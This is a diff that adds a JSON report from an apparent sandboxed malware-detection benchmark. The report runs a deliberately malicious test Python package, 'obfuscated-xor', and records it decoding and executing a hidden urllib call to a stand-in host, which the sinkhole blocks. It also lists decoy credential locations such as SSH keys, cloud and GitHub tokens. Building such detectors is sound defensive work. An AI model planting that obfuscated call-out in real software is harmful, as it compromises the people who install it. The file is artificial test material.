@@ -1,0 +1,600 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "obfuscated-xor",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "d3a1ac6bbb9528c1446c8dbb38e9dfa1190b19e2cd9d0cb72c0b9b4c1e50881d",
+  "path": "bench/packages/malicious/obfuscated_xor"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "sinkhole",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "gcloud_creds",
+   "docker_config",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default",
+   "clock+30d"
+  ],
+  "started_at": "2026-10-27T11:56:13.282112+00:00",
+  "duration_s": 6.32,
+  "stub": false,
+  "tool_versions": {
+   "python": "Python 3.12.3",
+   "bwrap": "bubblewrap 0.9.0",
+   "strace": "strace -- version 6.8",
+   "libfaketime": "/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1"
+  }
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 106,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "dynamic_exec",
+   "detail": {
+    "code_sha256": "3149e6c3fb060fe37e1ec172a607520c5c1f2fd0184fd6d9895bda6312d31354",
+    "decoded_snippet": "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)",
+    "source_kind": "compile"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 107,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "dynamic_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "http://198.51.100.33/xor"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev2",
+   "seq": 108,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.33/xor",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev3",
+   "seq": 109,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.33"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev4",
+   "seq": 110,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.33:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev5",
+   "seq": 111,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "dynamic_exec",
+   "detail": {
+    "code_sha256": "3149e6c3fb060fe37e1ec172a607520c5c1f2fd0184fd6d9895bda6312d31354",
+    "decoded_snippet": "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)",
+    "source_kind": "compile"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 112,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "dynamic_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "http://198.51.100.33/xor"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 113,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.33/xor",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev8",
+   "seq": 114,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.33"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev9",
+   "seq": 115,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "dev",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.33:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev10",
+   "seq": 222,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "dynamic_exec",
+   "detail": {
+    "code_sha256": "3149e6c3fb060fe37e1ec172a607520c5c1f2fd0184fd6d9895bda6312d31354",
+    "decoded_snippet": "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)",
+    "source_kind": "compile"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev11",
+   "seq": 223,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "dynamic_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "http://198.51.100.33/xor"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev12",
+   "seq": 224,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.33/xor",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev13",
+   "seq": 225,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.33"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev14",
+   "seq": 226,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.33:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev15",
+   "seq": 227,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "dynamic_exec",
+   "detail": {
+    "code_sha256": "3149e6c3fb060fe37e1ec172a607520c5c1f2fd0184fd6d9895bda6312d31354",
+    "decoded_snippet": "import urllib.request;urllib.request.urlopen('http://198.51.100.33/xor',timeout=2)",
+    "source_kind": "compile"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev16",
+   "seq": 228,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "dynamic_exec",
+   "detail": {
+    "co_name": "<module>",
+    "co_filename": "<string>",
+    "decoded_snippet": "http://198.51.100.33/xor"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/obfuscated_xor/__init__.py",
+    "line": 15,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev17",
+   "seq": 229,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.33/xor",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev18",
+   "seq": 230,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "host": "198.51.100.33"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev19",
+   "seq": 231,
+   "phase": "call",
+   "trigger": "call_all",
+   "profile": "ci",
+   "variant": "clock+30d",
+   "capability": "network",
+   "detail": {
+    "dest": "198.51.100.33:80"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "<string>",
+    "line": 1,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [
+   "no console-script entry points to run"
+  ],
+  "whitelisted_or_dropped_events": 212
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEYc1e54e057da9"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDSd4bd90438f81"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRCe726d3576b07"
+  },
+  {
+   "id": "gcloud_creds",
+   "kind": "file",
+   "where": ".config/gcloud/application_default_credentials.json",
+   "token": "TLCANARYGCLOUDCREDS55c57d8cafb6"
+  },
+  {
+   "id": "docker_config",
+   "kind": "file",
+   "where": ".docker/config.json",
+   "token": "TLCANARYDOCKERCONFIGec5f03f49980"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV78f34e23e08c"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENV83aaa6bdf3f9"
+  }
+ ],
+ "capability_summary": {
+  "dynamic_exec": {
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 8,
+   "canary_hit": false
+  },
+  "network": {
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": false,
+   "count": 12,
+   "canary_hit": false
+  }
+ }
+}
